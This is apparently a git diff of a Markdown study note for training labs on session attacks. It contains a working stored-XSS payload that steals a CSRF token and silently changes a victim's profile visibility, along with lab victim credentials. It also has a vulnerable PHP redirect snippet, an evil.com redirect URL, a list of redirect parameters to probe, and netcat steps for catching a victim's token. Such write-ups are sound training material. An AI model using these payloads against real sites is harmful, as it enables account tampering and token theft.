@@ -318,7 +318,7 @@ Forward the request to make the profile public.
 
 Place the following payload in Country field of Ela Stienen’s profile:
 
-<script>
+<pre><script>
 var req = new XMLHttpRequest();
 req.onload = handleResponse;
 req.open('get','/app/change-visibility',true);
@@ -330,45 +330,111 @@ function handleResponse(d) {
     changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     changeReq.send('csrf='+token+'&action=change');
 };
-</script>
+</script></pre>
 
 
 ## Payload Breakdown
 
 Create GET request to fetch CSRF token
 
-var req = new XMLHttpRequest();
+<pre>var req = new XMLHttpRequest();
 req.onload = handleResponse;
 req.open('get','/app/change-visibility',true);
-req.send();
+req.send();</pre>
 
 Handle GET response to extract CSRF token
 
-var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+`var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];`
 
 Send POST request with CSRF token to change visibility
 
-var changeReq = new XMLHttpRequest();
+<pre>var changeReq = new XMLHttpRequest();
 changeReq.open('post', '/app/change-visibility', true);
 changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-changeReq.send('csrf='+token+'&action=change');
+changeReq.send('csrf='+token+'&action=change');</pre>
+
 csrf: extracted token
 
 action=change: parameter required for request
 
 ## Test the Attack
 
-Submit payload in Country field → click Save
-
-Open New Private Window, log in as victim:
+1.Submit payload in Country field → click Save
+2.Open New Private Window, log in as victim:
 
 Email: goldenpeacock467
 Password: topcat
 
-Visit attacker’s profile:
+3.Visit attacker’s profile:
 
-http://minilab.htb.net/profile?email=ela.stienen@example.com
+`http://minilab.htb.net/profile?email=ela.stienen@example.com`
 
-Reload victim’s profile page → visibility changed to public
+4.Reload victim’s profile page → visibility changed to public
 
 You just executed a CSRF attack via XSS, bypassing same-origin protections!
+
+
+# Open Redirect
+
+An Open Redirect vulnerability occurs when an application redirects users to a URL without validating it. Attackers can leverage this to send victims to malicious sites while appearing legitimate.
+
+**Vulnerable Code Example**
+
+<pre>$red = $_GET['url'];
+header("Location: " . $red);
+$_GET['url'] → gets the URL parameter from the request</pre>
+
+`header("Location: " . $red);` → redirects to whatever the user specifies
+
+No validation → open redirect vulnerability
+
+Malicious URL example:
+
+`trusted.site/index.php?url=https://evil.com`
+
+## Common URL Parameters to Check
+
+<pre>?url=
+?link=
+?redirect=
+?redirecturl=
+?redirect_uri=
+?return=
+?return_to=
+?returnurl=
+?go=
+?goto=
+?exit=
+?exitpage=
+?fromurl=
+?fromuri=
+?redirect_to=
+?next=
+?newurl=
+?redir=</pre>
+
+## Lab Setup
+
+Spawn the target system and configure vhost: `oredirect.htb.net`
+
+Navigate to:
+
+`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN>`
+
+Fill in an email → application makes a POST request to the page in redirect_uri with a token.
+
+## Test Open Redirect
+
+**Set up Netcat listener:**
+
+`nc -lvnp 1337`
+
+**Modify the URL to point to your listener:**
+
+`http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN IP>:PORT&token=<RANDOM TOKEN>`
+
+- Open a New Private Window, navigate to the modified link, and submit email.
+- Connection is received on your listener
+- POST request includes the user token
+- This confirms Open Redirect vulnerability.
+
